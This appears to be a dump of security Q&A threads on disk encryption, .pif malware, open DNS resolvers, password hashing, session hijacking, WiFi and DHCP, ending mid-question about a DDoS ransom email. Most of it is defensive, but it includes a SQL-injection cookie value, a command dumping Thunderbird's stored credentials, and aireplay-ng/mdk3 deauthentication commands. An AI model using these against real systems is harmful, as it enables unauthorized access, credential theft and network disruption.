<p><em>Diagram of full-disk encrypted dual-boot process (yellow boxes are encrypted partitions; padlocks are another layer of security)</em></p>

<h1>Possible adjustments for your situation</h1>

<ul>
<li><p>I didn't use Truecrypt on the Linux side except to mount the Windows partitions. I'm not sure how to mount native Linux-encrypted partitions from Windows, so my setup was rather one-way. You might consider using Truecrypt to encrypt at least your Linux <code>/home</code> directory and let native Linux encryption protect the <code>/swap</code> partition, for example. This might allow Truecrypt on the Windows side to mount your Linux files.</p></li>
<li><p>Re-partition your hard drive in-place, or add another drive for Red Hat. The folks over at <a href=""http://superuser.com"">SuperUser</a> probably know more about this.</p></li>
<li><p>Figure out how you're going to partition your hard drive ahead of time... you don't need as many partitions as I used.</p></li>
</ul>

<h1>Requirements</h1>

<ul>
<li><p>A computer with at least one hard disk you are willing to wipe clean (Back up your data first, of course...)</p></li>
<li><p>Installation discs of the OSes you wish to install</p></li>
<li><p><a href=""http://gparted.sourceforge.net/"">Gparted</a> LiveCD or LiveUSB</p></li>
<li><p><a href=""http://truecrypt.org"">TrueCrypt</a></p></li>
<li><p><a href=""http://neosmart.net/EasyBCD"">EasyBCD</a> to modify the Windows boot loader (There's a free version...)</p></li>
</ul>

<hr>

<h1>Instructions</h1>

<p>Back up your data. You are going to wipe the hard disk totally clean and reformat it very soon.</p>

<p>Reformat the entire drive. To do this, I use Gparted LiveCD. If you don’t want to use Gparted, Fedora 10’s installer comes with a partition editor. But, it’s a bit trickier. You’ll have to partially complete the Fedora setup in order to get to it, apply the changes to the disk, then exit setup because Fedora shouldn’t be installed first. (Windows Vista’s partition editor is NOT powerful enough. You cannot use it for this.) I strongly encourage the use of a Gparted LiveCD or LiveUSB.</p>

<p>I thought about how to split up my drive and after a while, I came up with this:</p>

<p><img src=""https://i.stack.imgur.com/vKcqe.jpg"" alt=""Partition map""></p>

<p><em>Partition layout for dual booting Fedora 10 and Windows Vista with TrueCrypt</em></p>

<p>I wish I had sized them differently in hindsight, but you can do it however you want. Each padlock indicates an encrypted partition. The yellow padlocks with “TC” are encrypted with TrueCrypt in Windows. The blue ones are encrypted by Fedora. As you can see, each and every partition - except, of course, the /boot partition - is encrypted. Partitions labeled in red are for Windows. Black is for Linux.</p>

<p>Okay, so this is a setup that works for me. Basically, you’ll want these things:</p>

<ul>
<li><p>A primary boot partition to put Grub (the boot loader Fedora can install for you) - I recommend about 50 to 100 megabytes. Do not flag this as “bootable” when partitioning - Windows will complain.</p></li>
<li><p>An extended partition to hold all the “data” or “miscellaneous” partitions. This will hold your Fedora /home directory (basically the “My Documents” folder of Linux), Windows backup partition (optional), and your Linux swap file (highly recommended). The swap file should be at least as large as your RAM’s capacity.</p></li>
<li><p>A primary partition for Windows Vista to be installed to.</p></li>
<li><p>A primary partition for Fedora 10 to be installed to.</p></li>
</ul>

<p>Partition your drive as such and be sure to format with the appropriate file systems. You can use the table above as reference.</p>

<p>Write down the sizes of your partitions (in order) and their filesystem. You'll need this during the OS installs.</p>

<p>Start installing Windows Vista. You’ll be forced to do a custom installation. Choose the primary NTFS partition you reserved for the Windows install. Don’t forget to load hard disk drivers - especially on laptops. If your Windows install hangs around 70%, then you need to install the SATA drivers for your laptop. Once drivers are loaded and you select the right partition, install Windows.</p>

<p>After Windows installs, boot into it normally and finish setup. Don’t spend too much time customizing things yet. Once it is running, shut down and insert the Fedora 10 DVD. Boot to that and install Fedora. However, take note of the following: </p>

<ul>
<li><p>Be sure you choose to do a <em>custom layout</em> for your partitioning. Fedora will want to wipe things and create its preferred partition layout by default. Don’t let it do this. Make sure you go straight to the part where you can view and modify your current partition information.</p></li>
<li><p>Don’t format the NTFS partitions. Windows is on one of them.</p></li>
<li><p>Be sure to set the mount point for the small partition (100 MB?) to be /boot. -Check “Format as” and select “ext3.” You cannot encrypt this partition.</p></li>
<li><p>Set the mount point for the partition for your /home directory to… you guessed it: /home. Check “Format as ” and select “ext3″ then choose the “Encrypt” option.</p></li>
<li><p>Set the mount point for the partition for your swap file as /swap. Linux will have to format it and you should, of course, select “Encrypt.”</p></li>
<li><p>Set the mount point for the partition for your main Fedora install to be “/”. Check “Format as” and select “ext3″ then choose the “Encrypt” option.</p></li>
</ul>

<p>Before continuing, ensure that neither of the NTFS partitions have a check mark next to them. If they do, they will be formatted and you’ll have to start over. Continue. Fedora will warn you it will delete all the data on the modified partitions. That’s okay. You may have to set your passwords now as well. Go ahead and do that.</p>

<p>Soon it will ask you about the boot loader. Tread carefully here. Do not write the GRUB boot loader to the MBR. When it says “Install the boot loader on/dev/sda1″ (the “sda1″ may be different) - keep the box checked but click “Change Device” and choose “first sector of boot partition” instead.</p>

<p>After that step, you should be home free. Finish up the install and reboot the computer. It will boot straight into Windows.</p>

<p>Once Windows loads, download and install EasyBCD. You’ll want it to easily modify the Windows boot loader. Add an entry to the boot loader: click “Add/Remove Entries” - choose the “Linux” tab, select “GRUB” from the dropdown, and name it something intelligent. Choose the partition that contains GRUB, not Fedora. Leave the checkbox unchecked.</p>

<p>Add the entry then try rebooting. You should now be able to boot into either Fedora or Windows! Boot into Windows again and encrypt it, as follows:</p>

<p>Install TrueCrypt and create a new volume. Choose “Encrypt the system partition or entire system drive.” From this point, you’ll have to choose the proper options. Read them carefully! I don’t remember the exact sequence, but you need to specify “Multi-boot” at some point. At the end it will ask whether Windows has its boot loader in the MBR or if a different boot loader is used (like GRUB). Remember: we're using the Windows’ boot loader (we want Truecrypt to ""overtake"" it).</p>

<p>Once you’ve finished the volume creation wizard, you’ll be asked to “Test” the system. It will restart for you. It should boot into the TrueCrypt boot loader where you’ll type your password. After that, it should load the Windows boot loader where you can boot into either Linux or Windows.</p>

<p>From here, finish encrypting the Windows system partition, then remember to encrypt any other NTFS partitions you made for Windows.</p>

<p>When you’re done, try booting into Linux. It should go to the GRUB boot menu where you can select Fedora or change your mind and go back to Windows. As Fedora boots, you’ll be asked for your password as it mounts the encrypted partitions.</p>

<hr>

<h1><strong>Tl; dr (Too long; didn't read)</strong></h1>

<p>It took me a few tries to get it right with two OSes, and employed the use of software like EasyBCD, Truecrypt, and Gparted, but I was successful in the end... for 2 OSes. Good luck with 4. <em>The key is to plan effectively.</em> Size and format your partitions properly, then install operating systems in the correct order. (Usually Windows goes first.)</p>

<p>PS. Hm, For a simpler solution, though not quite what you asked for: have you considered running 3 of the 4 operating systems in virtual machines? You can encrypt the host machine, thus protecting the other 3 at the same time. (And if you're worried about losing the VHD files, remember you can fully encrypt the guest OSes, too.)</p>
","14951"
"How is it possible to embed executable code in an image","29872","","<p>I was reading up on <a href=""http://www.fireeye.com"">FireEye</a> and came across <a href=""http://www.nytimes.com/2015/02/02/world/middleeast/hackers-use-old-web-lure-to-aid-assad.html?ref=technology&amp;_r=1"">this NYTimes article</a> detailing a Skype chat where an image was sent that was <em>laden with malware</em>:</p>

<p>Quote:</p>

<blockquote>
  <p>To gain access to information on the devices..., hackers posed as women on Skype, identified the types of  devices the targets were using and sent photos laden with malware. </p>
  
  <p>The second photo was a particularly potent piece of malware that copied files from the targets computer</p>
</blockquote>

<p>I know that exif data and IPTC headers exist in images and am pretty sure you could stuff some extra info in an image file using FileMagic mimetype header info, <strong>but how is it possible to embed executable code in an image?</strong> </p>

<p>The image file format was <em>pif</em> so unless the computer had an app that opened the file and showed a picture while secretly exectuing code, I dont see how its possible.</p>
","<p>The answer is simple. That was <em>not</em> a photo. And <code>.pif</code> is <em>not</em> an image format. Count on NYTimes to provide correct technical info.</p>

<p>As the log on NYTimes's article says, and as <a href=""https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-behind-the-syria-conflict.pdf"">FireEye's actual report</a> confirms, the file used was a <a href=""http://en.wikipedia.org/wiki/Program_information_file"">.pif file</a>. It's one of the less known of Windows's executable file extensions.</p>

<p>.pif is legacy from MS-DOS, like .com. It's intended to be a ""program information file"" (hence the name), storing a shortcut to a (DOS) program along with various info to the system on how to treat it. Even today, Windows gives .pif files a shortcut-type icon.</p>

<p>The funny thing is that, today, Windows doesn't really care if the .pif is really just a program information file. Try it: rename any .exe file into a .pif and run it. There might be some difference like the icon not displaying, but that's all. That's what uniform treatment of files of different formats gets you. <em>Thanks, Microsoft!</em></p>

<p>Why does this happen? Short answer: <em>Because Windows</em>. Longer answer: Windows runs a .pif through <a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/bb762153%28v=vs.85%29.aspx""><code>ShellExecute</code></a>, which technically should find a suitable program to open a file and then use it to open it. With .pif files, it first checks if it is really a file that points to an MS-DOS executable. If it doesn't conform to the .pif file format, ShellExecute checks if it contains executable code. If it does, it gets run as if it was a .exe. Why? <em>Because Windows!</em></p>

<p>What did the <em>suuper-scary genius hackers</em> do? These guys didn't bother doing anything complicated: they made a self-extracting-and-executing SFXRAR archive out of a virus installer and a program (probably just a .bat) opening an image of a girl that they found on the internet, renamed that <em>devilish contraption</em> into a .pif file and sent it to the hapless freedom fighter.</p>

<p>Why did they use .pif? For two reasons, obviously:</p>

<ol>
<li><p>Few people know that it can run as an executable file (<em>thanks, Microsoft!</em>)</p></li>
<li><p>It obviously sounds like .gif or .tiff or .pdf or something very <em>image-y</em>. Even you didn't doubt from its name that it was an image format, didn't you, OP? ;)</p></li>
</ol>

<p>Concerning your actual question (""how is it possible to embed executable code in an image""). Yes, it is possible to execute code via a specially crafted image provided it is opened in a vulnerable program. This can be done by exploiting an attack like a <em>buffer overflow</em>. But these specific hackers were most probably not clever enough for this.</p>

<p><strong>Edit</strong></p>

<p>Interesting note: these guys actually used DarkComet, which has the ability to generate compressed executables with different extensions, .pif being in their list. I'm not sure about displaying an image, but this could be a functionality added in a newer version.</p>

<p><strong>Another edit</strong></p>

<p>I see you're asking on how to protect against this specific ""<em>vulnerability</em>"". The answer is simple.</p>

<p>First, make sure <em>Windows shows you file extensions</em>. Windows mostly hides them by default (<em>thanks, Microsoft!</em>)</p>

<p>Then learn this by heart: <code>.exe .com .cmd .bat .pif .vb .vba .vbs .msi .reg .ws .wsc .wsf .cpl .lnk</code>. These are the best known file types that can easily execute potentially malicious code or otherwise harm your computer if opened, whether you have vulnerable applications installed or not. If someone sends you such a file saying it's an image of a pretty girl, you can be sure it's another low-profile hacker like these syrian guys.</p>

<p>Another option is simply being pro-active and checking and double-checking any downloaded file with an unfamiliar file format. It could be malware, you know.</p>

<p>As for real images with exploits... you could probably try keeping your software up to date.</p>
","81926"
"How can I identify open DNS resolvers in my network?","29752","","<p><a href=""http://arstechnica.com/security/2012/10/meet-the-network-operators-helping-fuel-the-spike-in-big-ddos-attacks/"">This article</a> highlights how open DNS resolvers are being used to create DDOS attacks across the internet.   How can I identify whether any of our DNS servers are open?  If I find that we are running open DNS servers, how would I close them to prevent them being abused for DDOS attacks?</p>
","<ul>
<li><strong>Identify an Open DNS server</strong> by your own <strong>querying via NMAP</strong>:</li>
</ul>

<p>x.x.x.x = DNS server IP</p>

<p><em>nmap -sU -p 53 -sV -P0 --script ""dns-recursion"" x.x.x.x</em></p>

<p>Possible output would be:</p>

<p><em>PORT   STATE SERVICE VERSION</em><br>
<em>53/udp open  domain  ISC BIND ""version""</em><br>
*|_dns-recursion: Recursion appears to be enabled*<br>
<br></p>

<ul>
<li><strong>Online services</strong>:<br></li>
</ul>

<p>If you prefer make use of online services, openresolver project is very good, it checks also subnets of /22 width, so check it out ---> <a href=""http://www.openresolverproject.org"">http://www.openresolverproject.org</a><br></p>

<p>After an Open DNS server discovery with online tools is a good idea to do a double check getting a proof about recursion ---> <a href=""http://www.kloth.net/services/dig.php"">http://www.kloth.net/services/dig.php</a><br></p>

<p>Example output, watch the <strong>""ra""</strong> flag means recursion available:<br>
 <em>; &lt;&lt;>> DiG 9.7.3 &lt;&lt;>> @x.x.x.x domain.cn A</em><br>
 <em>; (1 server found)</em><br>
 <em>;; global options: +cmd</em><br>
 <em>;; Got answer:</em><br>
 <em>;; ->>HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: xxx</em><br>
 <em>;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 5, ADDITIONAL: 0</em><br>
<br>
<br>
<strong>DISABLING RECURSION</strong><br>
(<em>source knowledgelayer softlayer com</em>)</p>

<p>Disable Recursion in Windows Server 2003 and 2008</p>

<pre><code>Access the DNS Manager from the Start menu:
    Click the Start button.
    Select Administrative Tools.
    Select DNS.
Right click on the desired DNS Server in the Console Tree.
Select the Proprerties tab.
Click the Advanced button in the Server Options section.
Select the Disable Recursion checkbox.
Click the OK button.
</code></pre>

<p>Disable Recursion in Linux</p>

<pre><code>Locate the BIND configuration file within the operating system. The BIND configuration file is usually located in one of the following paths:
    /etc/bind/named.conf
    /etc/named.conf
Open the named.conf file in your preferred editor.
Add the following details to the Options section:
allow-transfer {""none"";};
allow-recursion {""none"";};
recursion no;
Restart the device.
</code></pre>
","44127"
"If a provider sees the last 4 characters of my password, can they see it in full?","29709","","<p>I have some domains/websites as well as emails with Bluehost.  Every time I need support, they need the last 4 characters of my main password for the account.  They cannot tell me how they store the password, so  I am intrigued in how they could safely store my password(s) and still see the last 4 characters. Do they see the full password in plain text?</p>
","<p>There's several possibilities.</p>

<ol>
<li><p>They could be storing the full password in plaintext, and only
displaying the last 4 characters to the support person.</p></li>
<li><p>They could be hashing the password twice.  Once hashing the full password,
and again with just the last 4.  Then the support person types in
the last 4 to see if it matches the hashed value.  The problem with
this is that it makes it easier to brute force the full password
since the last 4 characters are in a separate hash, reducing entropy.</p></li>
<li><p>They could be hashing the full password, and storing the last 4 in
plaintext.  Obviously this makes it much easier to brute force the
password if an attacker gaining access to the password database knows     the last 4 digits.</p></li>
<li><p>Something else where the last 4 characters are stored in some way
that's discover able, such as encryption that Mike Scott mentions below.  If the secret to unlock the 4 characters can be discovered, this is as bad as plaintext.</p></li>
</ol>

<p>All scenarios are very bad, and greatly reduce the security of the system.   It's not possible to know which scenario they're using, but each of them shows a lack of consideration for security breaches.  I'd advise caution if this is a site where you care about your account being breached.  </p>
","100485"
"What is the difference between SSL and X.509 Certificates?","29682","","<p>I used <code>openssl</code> to create a X.509 certificate but I don't quite understand the relationship between a X.509 and a SSL certificate. Are they the same? Is a SSL certificate just a X.509 certificate that is used for SSL?</p>
","<p>SSL is by far the largest use of X.509 certificates, many people use the terms interchangeably. They're not the same however; a ""SSL Certificate"" is a X.509 Certificate with Extended Key Usage: Server Authentication (1.3.6.1.5.5.7.3.1).</p>

<p>Other ""common"" types of X.509 certs are Client Authentication (1.3.6.1.5.5.7.3.2), Code Signing (1.3.6.1.5.5.7.3.3), and a handful of others are used for various encryption and authentication schemes.</p>
","36933"
"Is a longer WiFi password more secure?","29594","","<p>Today I had to type the same password to connect to a WPA2-secured WiFi network several times, and got really annoyed with the length of the password. Especially since it is just a phrase repeated twice.</p>

<p>So, when using WPA2 with a WiFi router, is it always more secure to use longer passwords?</p>
","<p>A short paragraph from <a href=""https://security.stackexchange.com/a/2253/953"">another answer I have here</a> pretty much covers this, though not in much detail:</p>

<hr>

<p><strong>The amount of protection offered by implementing a password in any system will always vary in direct proportion to the password complexity, and the effort taken to protect that password. Wireless networks are no exception.</strong></p>

<hr>

<p>Where a strong hashing mechanism is in use, longer and more complex passwords will almost invariably put you in a better security posture.  I strongly suggest you read some of the other <a href=""/questions/tagged/passwords"" class=""post-tag"" title=""show questions tagged &#39;passwords&#39;"" rel=""tag"">passwords</a> questions we have here.  One of particular interest is:</p>

<p><a href=""https://security.stackexchange.com/questions/6095/xkcd-936-short-complex-password-or-long-dictionary-passphrase"">XKCD #936: Short complex password, or long dictionary passphrase?</a></p>

<p>It should be noted though, that a WPA2 network's PSK is only effective where WPS is either disabled or unsupported on the AP.  Recent side-channel attacks allow an attacker to break WPS in a relatively short time, and gather the WPA2 PSK directly from the AP without having to actually crack the PSK itself.</p>
","12649"
"How to hijack a session?","29565","","<p>Despite the blatant title of the question, this is actually for a genuine purpose.</p>

<p>My site uses PHP code like this:</p>

<pre><code>    $select=""select id from tableA where user_id='"".$_SESSION['sess_user_id'].""'"";
</code></pre>

<p>I'm really trying to think like a hacker and figure out how I can alter this value. I've read articles talking ""about"" session hijacking, but being vague about how that can be done...</p>
","<p>Basically when you hijack someones session you take their sessionID and pretend its your own. Usually the sessionID is transferred in the cookie, meaning that if you can access the other parties cookie you can just put it in your own cookie and you've stolen their session.</p>

<p>This can be done in several ways, for example by sniffing the wireless network and looking at the HTTP packets being transfered or by <a href=""https://security.stackexchange.com/questions/1368/can-anybody-explain-xss-to-an-idiot"">XSS attack</a> where you can tell the victims browser to reveal their cookie information to you.</p>

<p>I would like to mention that the example you describe in your question may also be vulnerable to SQL-Injection. If I change my cookie's sessionID to </p>

<pre><code>asdf' OR 1=1-- 
</code></pre>

<p>I would most likely be authenticated as a valid user. To prevent this you have to make sure you have proper sanitizing on dirty data coming from your clients before you use the data for anything. </p>
","2089"
"Encrypting using AES-256, can I use 256 bits IV?","29512","","<p>I want to encrypt data using AES in java, and I want to intialize the cipher with Initialisation Vector.
Can I use 256-bits IV ? Or I must use only 128-bits IV ?</p>
","<p>The IV depends on the <a href=""http://en.wikipedia.org/wiki/Block_cipher_mode_of_operation"">mode of operation</a>. For most modes (e.g. CBC), the IV must have the same length as the <em>block</em>. AES uses 128-bit blocks, so a 128-bit IV. Note that AES-256 uses a 256-bit key (hence the name), but still with 128-bit blocks.</p>

<p>AES was chosen as a subset of the family of block ciphers known as <strong>Rijndael</strong>. That family includes no less than 15 variants, for three possible block sizes (128, 192 and 256 bits) and five possible key sizes (128, 160, 192, 224 and 256 bits). <a href=""http://en.wikipedia.org/wiki/Advanced_Encryption_Standard"">AES</a>, as standardized by NIST, includes only three variants, all with 128-bit blocks, and with keys of 128, 192 or 256 bits.</p>

<p>To further confuse things, some software frameworks got it wrong; e.g. PHP uses ""MCRYPT_RIJNDAEL_128"" to designate Rijndael with 128-bit keys and 128-bit blocks (i.e. the same thing as AES-128), and ""MCRYPT_RIJNDAEL_256"" for Rijndael with 256-bit keys and 256-bit blocks (i.e. not one of the AES variants, and in particular not at all AES-256).</p>
","90850"
"Is it possible to easily retrieve Thunderbird's passwords with access to HDD?","29509","","<p>I know Firefox 8 stores it's passwords in a SQLite database, which can easily be stolen with access to the HDD!</p>

<p>What about Thunderbird 8? How does it store the passwords and how can one retieve them?</p>

<p>I know NirSoft has this nice <a href=""http://www.nirsoft.net/utils/mailpv.html"">tool</a> to retrieve passwords, but it's not compatible with Thunderbird > 5.</p>
","<p>On linux, the password database is stored in:</p>

<pre><code>/home/$USER/.thunderbird/$RANDOM_STRING.default/signons.sqlite
</code></pre>

<p>See @Karrax's answer for Windows locations.</p>

<p>You can examine this file interactively using the sqlite3 CLI:</p>

<pre><code>sqlite3 ~/.thunderbird/zxcv1357.default/signons.sqlite

sqlite&gt; .tables
moz_disabledHosts  moz_logins
sqlite&gt; .schema moz_logins
CREATE TABLE moz_logins (id                 INTEGER PRIMARY KEY,hostname           TEXT NOT NULL,httpRealm          TEXT,formSubmitURL      TEXT,usernameField      TEXT NOT NULL,passwordField      TEXT NOT NULL,encryptedUsername  TEXT NOT NULL,encryptedPassword  TEXT NOT NULL,guid               TEXT,encType            INTEGER, timeCreated INTEGER, timeLastUsed INTEGER, timePasswordChanged INTEGER, timesUsed INTEGER);
CREATE INDEX moz_logins_encType_index ON moz_logins(encType);
CREATE INDEX moz_logins_guid_index ON moz_logins(guid);
CREATE INDEX moz_logins_hostname_formSubmitURL_index ON moz_logins(hostname, formSubmitURL);
CREATE INDEX moz_logins_hostname_httpRealm_index ON moz_logins(hostname, httpRealm);
CREATE INDEX moz_logins_hostname_index ON moz_logins(hostname);
sqlite&gt; select * from moz_logins;
3|imap://imap.example.com|imap://imap.example.com||||MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIQwErTyUiOp12345GmuM2KNXcZ=|MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIQwErTyUiOp12345GmuM2KNXcZ=|{1234abcd-beef-feed-face-0a0a0a0a0a}|1|1320123123123|1320123123123|1320123123123|1
4|smtp://smtp.example.com|smtp://smtp.example.com||||MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIQwErTyUiOp12345GmuM2KNXcZ=|MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIQwErTyUiOp12345GmuM2KNXcZ=|{1decafbad-fa11-1234-1234-abcdef0123456}|1|1320123123123|1320123123123|1320123123123|1
</code></pre>

<p>If you wanted to fetch usernames/passwords from code, it's as simple as:</p>

<pre><code>echo ""select encryptedUsername, encryptedPassword from moz_logins;"" | sqlite3 ~/.thunderbird/*.default/signons.sqlite
</code></pre>

<p>or the equivalent in your favorite programming language with sqlite3 bindings.</p>

<p>Of course, if they're encrypted (as shown above) you'll need to put some effort into guessing the master password used for encryption. As a user, know that if you use a weak master password (e.g. <code>P4ssw0rd1</code>) it will be trivial to get the cleartext passwords.</p>
","8819"
"How weak is MD5 as a password hashing function ?","29498","","<p>A professor told us today, that MD5 is weak. I understand his chain of thought but pointed out, that IMHO MD5 is a good way to go if you would use a long (even really long) dynamic salts and static pepper.</p>

<p>He stared at me and said NO!</p>

<p>IMHO the possibility to ""brute-force"" a md5 hash with a any dictionary is even simple. If you would use a dynamic/various salt it would be hardened to get a match with a complexity of O(2^n) and if I use a pepper before and after my salted password hash it would be not 100% safe but could take a long while to compute it..</p>
","<p>There are lots of known cryptographic weaknesses in MD5 which make it unusable as a message digest algorithm, but not all of these also apply in the context of password hashing. But even when we assume that these do not exist, MD5 is still a bad password hashing algorithm for one simple reason: <strong>It's too fast</strong>.</p>

<p>In any scenario where an attacker obtained the hashed passwords, you have to assume that they also obtained the salt of each password and the pepper.</p>

<p>The only reason to use a pepper is so you can't use a rainbow table precomputed before the attack, because you need a different one for each database. The only reason to use a salt is so you can't use the same rainbow table for the whole password database, because the same password for two different accounts will have a different hash.</p>

<p>The length of pepper and salt don't matter that much. Their only purpose is to make sure that each value is unique. More length doesn't make the attack notably harder (there is more data to hash, but that's a linear increase at most).</p>

<p>Bottom line is, a short salt is all that is needed to make sure that the attacker has to brute-force all possible passwords to find the correct hash for every single account.</p>

<p>And that's where MD5's weakness comes into play: It's a fast and memory-conserving algorithm. That means an attacker can compute the hash of a large number of passwords per second. Using specialized hardware (like FPGA arrays or ASICs) worth a few thousand dollar you can compute the hashes of all possible 8-character passwords for a given salt in mere hours.</p>

<p>For better security, use a slow algorithm like bcrypt. It means that your system needs some more CPU cycles to authenticate users, but the payoff is usually worth it because an attacker will also need a whole lot more processing power to brute-force your password database should they obtain it.</p>
","52463"
"WiFi deauth attack - Difference between Aireplay and MDK3","29463","","<p>I am currently working on some WiFi related security issues, and something appeared to me.</p>

<p>I have an Open WiFi network, to which a client connects.</p>

<p>I try the Deauth attack from Aireplay</p>

<blockquote>
  <p>aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 mon0</p>
</blockquote>

<p>However, this has no effect on the client nor the AP.</p>

<p>But, then I use MDK3 which is a software using the osdep library from the aircrack-ng project.</p>

<p>I do:</p>

<blockquote>
  <p>echo 00:14:6C:7E:40:80 > myfile </p>
</blockquote>

<p>Then </p>

<blockquote>
  <p>mdk3 mon0 d -b myfile -c 11</p>
</blockquote>

<p>And it works instantly! I tried to use wireshark to see what MDK3 is sending but there is too much WiFi pollution around and I don't know what I am looking for, I can't figure out what to do with it.</p>

<p>I would like to know if they are both sending Deauth frames, and if so, what is the difference between them ?</p>

<p>Do I misunderstand the attack run by MDK3 and therefore, could you please explain it to me ?</p>
","<p>I was able to sort out the difference in the attack, I think.</p>

<p>I found out that to filter MAC addresses for 802.11 packets I had to use wlan.addr.</p>

<p>After it, I could see that MDK3 would be sending both disassociation and de-authentication packets, where aireplay only sent de-authentication packets.</p>

<p>Since I am using a particular type of wifi, I think this is the reason why aireplay wasn't able to break it. When using a reguler Open Wifi AP, both of them would break the network,</p>

<p>Cheers</p>
","61408"
"VPN tunnel inside other VPN tunnel","29389","","<p>This question is kind of asked already but it was asked with different context:</p>

<ul>
<li><a href=""https://security.stackexchange.com/questions/58624/vpn-tunnel-in-vpn-tunnel"">VPN tunnel in VPN tunnel</a></li>
<li><a href=""https://security.stackexchange.com/questions/31030/connect-through-two-vpn-clients/31031"">Connect through two VPN clients</a></li>
<li><a href=""https://superuser.com/questions/763433/tunnel-in-a-tunnel-multi-vpn"">https://superuser.com/questions/763433/tunnel-in-a-tunnel-multi-vpn</a></li>
</ul>

<p>Say I am using DD-WRT flashed router which connects as a client to VPN server #1. </p>

<p>If I setup my machine that's behind the DD-WRT router, using a software VPN client to connect to VPN server #2, will I get 'doubled' anonymity (i.e it's harder to get logs from several VPN providers)? Will such a setup work?</p>

<p>Can I chain this (VPN-1 router behind VPN-2 router ... behind VPN-N) assuming that speed and latency is of no concern?</p>

<p>UPDATE: just to clarify my question: did anyone try this setup? I would like to have some confirmation from the person who used such setup or something similar.</p>
","<p>I've had this working on my home router for a few months with no issues. DD-WRT is configured as an openVPN client to a PrivateInternetAccess account so that all PCs are forced to use it for Internet traffic. Then I tunnel each PC using openVPN to a different service. Performance definitely takes a hit but it's still quite usable and there are no routing problems.</p>
","78855"
"Port Scan Detected and Blocked! - Bitdefender 2014","29356","","<p>I have Bitdefender Total Security 2014.</p>

<p>Recently I have been getting the message/alert ""Port scan detected and blocked"". I did not care about it much until I getting more especially in a specific timee. I was shocked when I saw the External IP of the attacker is from the same country where I am; so it's not a robot or virus, it's a hacker and I am his target.
Can the hacker break my security and access my computer if he found an opened port?</p>

<p>How to block port scanning by hackers? I have heard of NMap but I am not network specialist.</p>

<p>If my anti-virus and firewall are not the best, what do you recommend for me? All internet is saying Bitdefender is one of the best (if not the best!). But I have asked a specialist and he said ""COMODO"".</p>

<p>What configurations should I set on my router to help regarding this problem?
Should I allow the following settings or not?<br>
IGMP Snooping<br>
IGMP Snooping<br>
QoS<br></p>

<p>I have disabled UPnP<br>
Wifi password encrypted ""WPA2-PSK""<br>
I have enabled: ICMP Flooding, SYN Flooding and ARP Attack but I think my internet connection getting slower!<br>
<a href=""http://prntscr.com/5fabgc"" rel=""nofollow noreferrer"">http://prntscr.com/5fabgc</a><br></p>
","<p>This likely isn't as bad as it sounds.  If you have your computer plugged directly in to the modem, random port scanning of IP addresses on the internet is extremely common.  On my web server, I get about 30 to 100 invalid login attempts a day trying to get on my system.  </p>

<p>Hackers look for low hanging fruit, so they will scan large swaths of the Internet looking for vulnerable systems.  Just because you are seeing activity like this does not mean you are being targeted.</p>

<p>It does, however, illustrate the importance of protecting yourself from intrusions.  I would recommend getting a router with a firewall and set that up to prevent attackers from being able to directly attempt to access your computer.  This strategy is called defense in depth (now rather than simply exploiting your computer, they must first exploit the router and then try to exploit your computer and that gives you time to detect your router is compromised) and it will help protect you from attacks and prevent the port scans from reaching your computer (as they will instead be hitting the router's WAN port firewall instead.)</p>
","75781"
"Whats the difference between MAC vs hash","29340","","<p>What is the difference between the two algorithms?<br>
One difference that I know of, is that MAC is keyed and hash is not.  </p>
","<p>To make it simple: usually a MAC is a Hash value encrypted with a secret key.
For example, attackers can forge message and calculate a new hash, but he can't do so if the system requires hash to be encrypted with a secret key.</p>
","1890"
"DHCP vs. Static IP Addressing","29306","","<p>How do DHCP and Static IP addressing compare, from a security standpoint?  What are the risks/benefits associated with each?</p>

<p>I know the preferred solution between the two will vary with network size and layout, but I'm just looking for a more general explanation of how they compare.</p>

<p>Please answer from a security standpoint alone - disregarding topics such as network overhead and infrastructure costs, unless they directly and significantly affect the Confidentiality, Integrity, or Availability of the system.</p>
","<p>DHCP offers do leak some information about a network. The options contained reveal certain details about network layout and infrastructure, which is what DHCP is designed to do. Static assignment offers none of this detail.</p>

<p>The threat here is unauthorized connection to the network. That can be either a device plugging into a live network jack or a wireless client gaining access to a WLAN. Once the unauthorized connection has taken place the ability of the attacker to do anything once they have connected is where DHCP vs. Static comes into play.</p>

<p>DHCP with MAC registration is the most robust DHCP model. It doesn't offer addresses to any MAC it hasn't been told about, so in theory unauthorized devices won't be offered information. The same holds true for static assignment, there is no server to ask for addressing.</p>

<p>DHCP without MAC registration will allow unauthorized devices to consume an IP address.</p>

<p>MAC registration requires all new devices of any type to be registered with the DHCP system which can significantly increase how long it takes for a new device to be functional. Not all network devices have their MAC posted where they can be easily read, so some edge-case devices may require some bench testing to figure out what MAC they're using. Plug-and-go won't work (by design!). Additionally, if existing devices have their network cards swapped out for some reason, technicians will have to remember to re-register the new MAC. <em>Deregistration of old MACs</em> is a critical step of this process, and often missed until a DHCP scope fills.</p>

<p>There are a couple of attacks that make DHCP with MAC registration less useful. If an attacker can place a bridge between an authorized device and its network port (such as a laptop with two NICs) it can figure out that device's MAC address very simply. Any traffic monitored in this way will reveal the MAC address of the authorized device. Most network cards allow changing the MAC address, so all the attacker has to do is change the MAC on one of their NICs, unplug the authorized device, plug their re-numbered device in, and get access on a registered MAC.</p>

<p>On wireless, once an attacker has successfully broken into a WLAN to the point where they can monitor the airwaves; gaining MAC information is similarly easy. </p>

<p>The defense for this is Network Access Control. In order to talk to the network the attached device needs to be able to authenticate at a machine level. This defends against unauthorized devices attaching to a network as it prevents significant network conversation from happening. In the above scenario, the attacker's device would be denied access. Not all devices CAN use NAC, notably network-attached printers, so an attacker can focus on those devices, which means that network-disconnection events need to be monitored on those ports.</p>
","1927"
"I got an email threatening to DDOS me if I don't pay a ransom. What should I do?","29301","","<p>I received the following email, addressed to me at an email address on my personal domain (for which I run my own mail server on a VPS):</p>

<blockquote>
  <p>FORWARD THIS MAIL TO WHOEVER IS IMPORTANT IN YOUR COMPANY AND CAN MAKE
  DECISION!</p>
  
  <p>We are Armada Collective. <code>lmgtfy URL here</code></p>
  
